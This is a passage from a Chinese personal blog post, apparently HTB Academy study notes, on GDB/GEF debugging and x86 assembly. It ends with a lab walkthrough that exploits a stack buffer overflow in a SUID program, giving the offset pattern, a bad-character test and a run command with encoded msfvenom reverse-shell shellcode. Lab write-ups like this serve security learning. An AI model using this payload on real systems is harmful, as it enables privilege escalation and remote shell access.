class="line">───────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x401000 → _start()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>
<p>如果我们想在某个地址设置断点，例如<code>_start+10</code>，我们可以这样<code>b *_start+10</code>做<code>b *0x40100a</code></p>
<blockquote>
<p>程序运行后，如果我们设置另一个断点，例如<code>b *0x401005</code>，为了继续到该断点，我们应该使用<code>continue</code>或<code>c</code>命令。如果我们再次使用<code>run</code>或<code>r</code>，它将从头开始运行程序。这对于跳过循环很有用</p>
</blockquote>
<p>使用<code>info breakpoint</code>命令。我们也可以<code>disable</code>、<code>enable</code>或<code>delete</code>任何断点。此外，GDB 还支持设置条件断点，当满足特定条件时停止执行</p>
<p><code>Examine</code></p>
<p>手动检查任何地址或寄存器或检查任何其他地址或寄存器，我们可以使用<code>x</code>格式的命令<code>x/FMT ADDRESS</code>，正如<code>help x</code>所见。<code>ADDRESS</code>是我们要检查的地址或寄存器，而<code>FMT</code>是检查格式</p>
<p><code>FMT</code>分为</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><code>Count</code></th>
<th>我们要重复检查的次数</th>
<th>2、3、10</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Format</code></td>
<td>我们希望结果的表示格式</td>
<td><code>x(hex)</code>、<code>s(string)</code>、<code>i(instruction)</code></td>
</tr>
<tr>
<td><code>Size</code></td>
<td>我们要检查的内存大小</td>
<td><code>b(byte)</code>、<code>h(halfword)</code>、<code>w(word)</code>、<code>g(giant, 8 bytes，64-bits)</code></td>
</tr>
</tbody>
</table>
</div>
<p><strong>例</strong>：如果我们想检查接下来的四条指令，我们将必须检查寄存器<code>$rip</code>（它保存下一条指令的地址）,<code>4</code> for the <code>count</code>, <code>i</code> for the <code>format</code>, and <code>g</code> for the <code>size</code> (for 8-bytes or 64-bits)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/4ig $rip</span><br><span class="line"></span><br><span class="line">=&gt; 0x401000 &lt;_start&gt;:	mov    eax,0x1</span><br><span class="line">   0x401005 &lt;_start+5&gt;:	mov    edi,0x1</span><br><span class="line">   0x40100a &lt;_start+10&gt;:	movabs rsi,0x402000</span><br><span class="line">   0x401014 &lt;_start+20&gt;:	mov    edx,0x12</span><br></pre></td></tr></table></figure>
<p><strong>例</strong>：检查存储在特定内存地址的变量。我们知道我们的<code>message</code>变量存储在我们之前反汇编的<code>.data</code>地址部分<code>0x402000</code>，Count默认值为一无需指定，使用<code>s</code>格式以字符串格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/s 0x402000</span><br><span class="line"></span><br><span class="line">0x402000:	&quot;Hello HTB Academy!&quot;</span><br></pre></td></tr></table></figure>
<p>最常见的检查格式是十六进制<code>x</code>。我们经常需要检查包含十六进制数据的地址和寄存器，例如内存地址、指令或二进制数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/wx 0x401000</span><br><span class="line"></span><br><span class="line">0x401000 &lt;_start&gt;:	0x000001b8</span><br></pre></td></tr></table></figure>
<p>小端存储</p>
<p>任何时候我们都可以使用<code>registers</code>命令打印出所有寄存器的当前值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  registers</span><br><span class="line">$rax   : 0x0               </span><br><span class="line">$rbx   : 0x0               </span><br><span class="line">$rcx   : 0x0               </span><br><span class="line">$rdx   : 0x0               </span><br><span class="line">$rsp   : 0x00007fffffffe310  →  0x0000000000000001</span><br><span class="line">$rbp   : 0x0               </span><br><span class="line">$rsi   : 0x0               </span><br><span class="line">$rdi   : 0x0               </span><br><span class="line">$rip   : 0x0000000000401000  →  &lt;_start+0&gt; mov eax, 0x1</span><br></pre></td></tr></table></figure>
<p><code>step</code></p>
<p><code>stepi</code>或命令<code>si</code>将逐一执行汇编指令，这是调试时可能的最小步骤级别</p>
<p>我们可以<code>si</code>通过在命令后添加数字来重复该命令 <code>si 3</code></p>
<p><code>step</code>或<code>s</code>命令将一直运行，直到退出当前函数</p>
<p><code>modify</code></p>
<p>要在 GDB 中修改值，我们可以使用<code>set</code>命令。但是，我们将使用<code>GEF</code>中的命令<code>patch</code>使此步骤更加容易</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  help patch</span><br><span class="line"></span><br><span class="line">Write specified values to the specified address.</span><br><span class="line">Syntax: patch (qword|dword|word|byte) LOCATION VALUES</span><br><span class="line">patch string LOCATION &quot;double-escaped string&quot;</span><br></pre></td></tr></table></figure>
<p>我们必须提供新值的<code>type/size</code>、要存储的<code>location</code>以及我们要使用的<code>value</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  break *0x401019</span><br><span class="line"></span><br><span class="line">Breakpoint 1 at 0x401019</span><br><span class="line">gef➤  r</span><br><span class="line">gef➤  patch string 0x402000 &quot;Patched!\\x0a&quot;</span><br><span class="line">gef➤  c</span><br><span class="line"></span><br><span class="line">Continuing.</span><br><span class="line">Patched!</span><br><span class="line"> Academy!</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  break *0x401019</span><br><span class="line"></span><br><span class="line">Breakpoint 1 at 0x401019</span><br><span class="line">gef➤  r</span><br><span class="line">gef➤  patch string 0x402000 &quot;Patched!\\x0a&quot;</span><br><span class="line">gef➤  set $rdx=0x9</span><br><span class="line">gef➤  c</span><br><span class="line"></span><br><span class="line">Continuing.</span><br><span class="line">Patched!</span><br></pre></td></tr></table></figure>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><strong>只记些课上没学过的</strong></p>
<p>数据移动</p>
<p><code>lea</code>:加载指向值的地址    lea rax, [rsp+5]<code>-&gt;</code>rax = rsp+5</p>
<blockquote>
<p><code>mov rax, rsp</code>和<code>lea rax, [rsp]</code>都会执行相同的操作，但是，如果我们想加载一个带有偏移量的指针（即，距离变量或地址几个地址），我们应该使用<code>lea</code>，如<code>lea rax, [rsp+10]</code></p>
</blockquote>
<p><code>xchg</code>:在两个寄存器或地址之间交换数据    xchg rax, rbx<code>-&gt;</code>rax = rbx, rbx = rax</p>
<blockquote>
<p>在汇编中，移动数据不会影响源操作数。因此，我们可以将其视为<code>mov</code>一个<code>copy</code>函数，而不是实际的移动。</p>
<p>利用更短的寄存器更加高效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 fib.s &amp;&amp; objdump -M intel -d fib.o</span><br><span class="line">0000000000000000 &lt;_start&gt;:</span><br><span class="line">   0:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">   5:	bb 01 00 00 00       	mov    ebx,0x1</span><br><span class="line">   a:	b3 01                	mov    bl,0x1</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>简单无保护栈溢出，环境在HTBA</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">We were able to gain SSH access to a Linux machine whose password was reused by another machine during our penetration test.</span><br><span class="line">我们能够获得对一台Linux机器的SSH访问，在我们的渗透测试期间，另一台机器重用了该机器的密码。</span><br><span class="line"></span><br><span class="line">On this machine, we have a standard user &quot;htb-student&quot; who can leave a message to the administrator using a self-written program called &quot;leave_msg.&quot; Since the target company pays a lot of attention to defense from outside their network, and the administrator&#x27;s appearance showed high self-confidence, it may indicate that local security was disregarded.</span><br><span class="line">在这台机器上，我们有一个标准用户“htb-student”，他可以使用一个名为“leave_msg”的自编程序向管理员留言。“由于目标公司非常注重网络外部的防御，而且管理员的表现出高度的自信，这可能表明他们忽视了本地安全。</span><br><span class="line"></span><br><span class="line">After our research, we found out that these messages are stored in &quot;/htb-student/msg.txt,&quot; which is binary owned by the user root, and the SUID bit is set.</span><br><span class="line">经过我们的研究，我们发现这些消息存储在“/htb-student/msg.txt”中，这是用户root拥有的二进制文件，并且设置了SUID位。</span><br><span class="line"></span><br><span class="line">Examine the program and find out if it is vulnerable to a Stack-Based Buffer Overflow. If you have found the vulnerability, then use it to read the file &quot;/root/flag.txt&quot; placed on the system as proof.</span><br><span class="line">检查程序并找出它是否容易受到基于堆栈的缓冲区溢出的攻击。如果您发现了漏洞，请使用它来读取放置在系统上的文件“/root/flag.txt”作为证据。</span><br></pre></td></tr></table></figure>
<p>查看程序类型及功能</p>
<p><img src="https://s2.loli.net/2024/12/17/lJc4quo7XD9CObf.png" alt="3bcda70bd811270dde99815a8197b57d"></p>
<p><img src="https://s2.loli.net/2024/12/17/vMhe5Xaqr3G1YwP.png" alt="ff6c1b3f403621f56e6ac466085ac2c0"></p>
<p>用gdb调试，测出偏移在200~2100之间，EIP被覆盖为0x55555555</p>
<p><img src="https://s2.loli.net/2024/12/17/E9qIH35lUfcgYDb.png" alt="c20d422039b8941a9479921e188d35c9"></p>
<p>使用脚本生成并检测出精准偏移量</p>
<p><img src="https://s2.loli.net/2024/12/17/pfcKq568x7k2gFJ.png" alt="b9aa319b1ef79102b301fbac590d5607"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run $(python -c &quot;print &#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9&#x27;&quot;)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/12/17/M3ubZgf1jrGTtUN.png" alt="3ec890a68d2c448d4a1db42e479ed35a"><img src="https://s2.loli.net/2024/12/17/f6jIPXGweQyag4t.png" alt="3940fca0e1a8994b15dc6b1697d53110"></p>
<p>测试，eip被覆盖为0x66666666</p>
<p><img src="https://s2.loli.net/2024/12/17/RW4k9mOBC76jl5Q.png" alt="8d10fb7567f56cc4695ee6889e500027"></p>
<p>测试坏字符，在leavemsg下断点</p>
<p><img src="https://s2.loli.net/2024/12/17/mngIsYGCrQHRKBX.png" alt="866b373e793e96ec2835b410f1cda64b"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run $(python -c &#x27;print &quot;\x55&quot; * (2060 - 256) + &quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#x27;)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/12/17/RFj2alk6SWXdqQ7.png" alt="7b0af168e2539b7e189dff45aa09008a"></p>
<p>得到坏字符<code>0x00 0x09 0x0a 0x20</code>，利用msfvenom生成反弹shellcode</p>
<p><img src="https://s2.loli.net/2024/12/17/xYdwS4cpgjDXHml.png" alt="01335b1c39488230c1a58bc321c47eca"></p>
<p>写入shellcode，调试确定shellcode位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run $(python -c &#x27;print &quot;\x55&#x27; * (2060 - 95 - 100) + &quot;\x77&quot;*100 + &quot;\xd9\xcb\xb8\x5f\xb1\x6a\x02\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x12\x31\x43\x17\x83\xeb\xfc\x03\x1c\xa2\x88\xf7\x93\x1f\xbb\x1b\x80\xdc\x17\xb6\x24\x6a\x76\xf6\x4e\xa1\xf9\x64\xd7\x89\xc5\x47\x67\xa0\x40\xa1\x0f\x4c\xb3\x51\xce\xda\xb1\x51\xaa\x73\x3f\xb0\xfa\xe2\x6f\x62\xa9\x59\x8c\x0d\xac\x53\x13\x5f\x46\x02\x3b\x13\xfe\xb2\x6c\xfc\x9c\x2b\xfa\xe1\x32\xff\x75\x04\x02\xf4\x48\x47&quot; + &quot;\x66&quot; * 4&#x27;)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/12/17/x4vkWQLClsecYHp.png" alt="375d2b79d2721576db35d030d99f9d5d"></p>
<p>利用点前用空指令NOP（0x90）填充，运行程序收到反弹shell</p>
<p><img src="https://s2.loli.net/2024/12/17/dZCNXVFpzLgKtj2.png" alt="702811fb35087d168f816a3d217e0830"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://byforacle.github.io/B1og">Oracle</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://byforacle.github.io/B1og/2024/09/27/overflow/">https://byforacle.github.io/B1og/2024/09/27/overflow/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://byforacle.github.io/B1og" target="_blank">Oracle の blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/B1og/tags/python/">python</a><a class="post-meta__tags" href="/B1og/tags/%E6%B1%87%E7%BC%96/">汇编</a><a class="post-meta__tags" href="/B1og/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a></div><div class="post_share"><div class="social-share" data-image="https://www.z4a.net/images/2024/09/28/111.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/B1og/2025/01/01/python%20%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" title="python数学建模"><img class="cover" src="https://www.z4a.net/images/2025/01/01/wallhaven-qzx95q.png" onerror="onerror=null;src='/B1og/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">python数学建模</div></div></a></div><div class="next-post pull-right"><a href="/B1og/2024/07/29/deeplearn/" title="深度学习环境"><img class="cover" src="https://www.z4a.net/images/2024/07/29/wallhaven-851jyo.jpg" onerror="onerror=null;src='/B1og/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">深度学习环境</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/B1og/2025/01/01/python%20%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" title="python数学建模"><img class="cover" src="https://www.z4a.net/images/2025/01/01/wallhaven-qzx95q.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-01</div><div class="title">python数学建模</div></div></a></div><div><a href="/B1og/2023/07/22/python/" title="python（基础篇）笔记"><img class="cover" src="https://vip.helloimg.com/images/2023/10/14/oMKwn5.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-22</div><div class="title">python（基础篇）笔记</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC81ODk4MS8zNTQ0Mw=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/B1og/./img/head.jpg" onerror="this.onerror=null;this.src='/B1og/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Oracle</div><div class="author-info__description">我欲因之梦吴越，一夜飞度镜湖月</div></div><div class="card-info-data site-data is-center"><a href="/B1og/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/B1og/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/B1og/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Byforacle"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Byforacle" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:739640457@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/249646919" target="_blank" title="bilibili"><i class="fa-brands fa-bilibili"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E8%84%9A%E6%9C%AC%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">python脚本基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x86-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">x86 汇编基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%92%8C%E8%B0%83%E8%AF%95"><span class="toc-number">2.1.</span> <span class="toc-text">编译和调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GDB%E4%BD%BF%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">GDB使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.</span> <span class="toc-text">示例</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/B1og/2025/01/01/python%20%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" title="python数学建模"><img src="https://www.z4a.net/images/2025/01/01/wallhaven-qzx95q.png" onerror="this.onerror=null;this.src='/B1og/img/404.jpg'" alt="python数学建模"/></a><div class="content"><a class="title" href="/B1og/2025/01/01/python%20%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" title="python数学建模">python数学建模</a><time datetime="2024-12-31T16:30:00.000Z" title="发表于 2025-01-01 00:30:00">2025-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/B1og/2024/09/27/overflow/" title="缓冲区溢出"><img src="https://www.z4a.net/images/2024/09/28/111.png" onerror="this.onerror=null;this.src='/B1og/img/404.jpg'" alt="缓冲区溢出"/></a><div class="content"><a class="title" href="/B1og/2024/09/27/overflow/" title="缓冲区溢出">缓冲区溢出</a><time datetime="2024-09-27T15:30:00.000Z" title="发表于 2024-09-27 23:30:00">2024-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/B1og/2024/07/29/deeplearn/" title="深度学习环境"><img src="https://www.z4a.net/images/2024/07/29/wallhaven-851jyo.jpg" onerror="this.onerror=null;this.src='/B1og/img/404.jpg'" alt="深度学习环境"/></a><div class="content"><a class="title" href="/B1og/2024/07/29/deeplearn/" title="深度学习环境">深度学习环境</a><time datetime="2024-07-29T02:30:00.000Z" title="发表于 2024-07-29 10:30:00">2024-07-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/B1og/2024/07/10/tryhackme/" title="Welcome to TryHackMe"><img src="https://www.z4a.net/images/2024/07/10/wallhaven-wekq8q.jpg" onerror="this.onerror=null;this.src='/B1og/img/404.jpg'" alt="Welcome to TryHackMe"/></a><div class="content"><a class="title" href="/B1og/2024/07/10/tryhackme/" title="Welcome to TryHackMe">Welcome to TryHackMe</a><time datetime="2024-07-09T16:30:00.000Z" title="发表于 2024-07-10 00:30:00">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/B1og/2024/05/02/%E6%9D%82%E9%A2%98/" title="杂题复现"><img src="https://www.z4a.net/images/2024/05/03/wallhaven-yxr83d.jpg" onerror="this.onerror=null;this.src='/B1og/img/404.jpg'" alt="杂题复现"/></a><div class="content"><a class="title" href="/B1og/2024/05/02/%E6%9D%82%E9%A2%98/" title="杂题复现">杂题复现</a><time datetime="2024-05-02T02:00:00.000Z" title="发表于 2024-05-02 10:00:00">2024-05-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://www.z4a.net/images/2024/09/28/111.png')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Oracle</div><div class="footer_custom_text"><div>很高兴认识你😉</div><img src="https://www.z4a.net/images/2023/10/24/ICP.png"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=23060502000047"  target="_blank">黑公网安备 23060502000047号</a><div><a href="https://beian.miit.gov.cn/" target="_blank">黑ICP备2023011561号</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button 